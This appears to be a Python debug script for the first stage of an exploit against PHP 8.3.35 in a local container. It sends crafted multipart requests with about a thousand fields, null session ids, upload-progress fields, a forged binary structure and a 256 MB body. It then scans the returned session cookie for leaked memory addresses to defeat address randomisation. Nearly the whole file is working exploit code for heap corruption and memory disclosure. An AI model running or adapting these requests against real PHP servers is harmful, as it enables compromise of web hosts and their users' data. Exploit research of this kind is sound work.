#!/usr/bin/env python3
"""Debug stage1 on 8.3.35: print B-response head each attempt."""
import sys, os, time, struct, socket, re, urllib.parse
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from collections import Counter

PORT = 18112
CONTAINER = "p2s8335"
BIG_MB = 256

def send_raw(port, body, timeout=60, path="/", boundary=b"C"*10):
    req = (f"POST {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
           f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    resp = bytearray()
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(req + body)
        while len(resp) < (16 << 20):
            c = s.recv(65536)
            if not c: break
            resp.extend(c)
    except (OSError, ConnectionError) as e:
        print(f"    [send err] {e}", flush=True)
    finally:
        try: s.close()
        except: pass
    return bytes(resp)

def build_multipart(parts, boundary):
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename"):
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)

def rotate(port):
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V"*3000} for i in range(1001)]
    parts += [{"name":"PHPSESSID","data":b"\x00"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
              {"name":"f","filename":"a.txt","data":b"A"*64},
              {"name":"big","data":b"B"*(BIG_MB*1024*1024)}]
    r = send_raw(port, build_multipart(parts, b"S"*17), timeout=120)
    print(f"    rotate A: {len(r)}B status={r.split(bchr(10),1)[0] if r else b'EMPTY'}", flush=True)
    time.sleep(0.4)
    parts2 = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
              {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
    r2 = send_raw(port, build_multipart(parts2, b"BNDRY12345"), timeout=30)
    print(f"    rotate B: {len(r2)}B", flush=True)
    time.sleep(0.5)

def bchr(n): return bytes([n])

def main():
    for attempt in range(1, 7):
        print(f"=== attempt {attempt} ===", flush=True)
        rotate(PORT)
        # A request
        parts = [{"name":f"p{i:04d}","data":b"x"} for i in range(1001)]
        parts += [{"name":"PHPSESSID","data":b"\x00"},
                  {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"},
                  {"name":"f","filename":"a.txt","data":b"A"*64},
                  {"name":"big","data":b"B"*(BIG_MB*1024*1024)}]
        ra = send_raw(PORT, build_multipart(parts, b"S"*17), timeout=120)
        head = ra.split(b"\r\n\r\n")[0].decode("latin1","replace") if ra else "EMPTY"
        print(f"    A: {len(ra)}B", flush=True)
        for line in head.splitlines()[:6]:
            print(f"      {line}", flush=True)
        time.sleep(0.2)
        # B request
        parts = [{"name":"PHPSESSID","data":b"attacksessionid0001"},
                 {"name":"PHP_SESSION_UPLOAD_PROGRESS","data":b"pwn"}]
        for i in range(841):
            val = (f"v{i:04d}"+"x"*44)[:48]
            parts.append({"name":str(1000+i),"data":val.encode()})
        forge = bytearray(b"A"*79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name":"1999","data":bytes(forge)})
        rb = send_raw(PORT, build_multipart(parts, b"B"*10), timeout=60)
        print(f"    B: {len(rb)}B", flush=True)
        if rb:
            # find Set-Cookie
            m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*)", rb)
            if m:
                val = m.group(1).decode("latin1")
                raw = urllib.parse.unquote_to_bytes(val)
                print(f"    cookie raw len = {len(raw)}", flush=True)
                c = Counter()
                for i in range(len(raw)-8):
                    v = int.from_bytes(raw[i:i+8],"little")
                    if 0x7F0000000000 <= v < 0x800000000000:
                        c[v & ~0x1FFFFF] += 1
                print(f"    buckets: {[(hex(b),n) for b,n in c.most_common(5)]}", flush=True)
            else:
                print("    no Set-Cookie; head:", flush=True)
                print(rb[:300].decode("latin1","replace"), flush=True)
        else:
            print("    EMPTY response", flush=True)
        time.sleep(0.5)

if __name__ == "__main__":
    main()
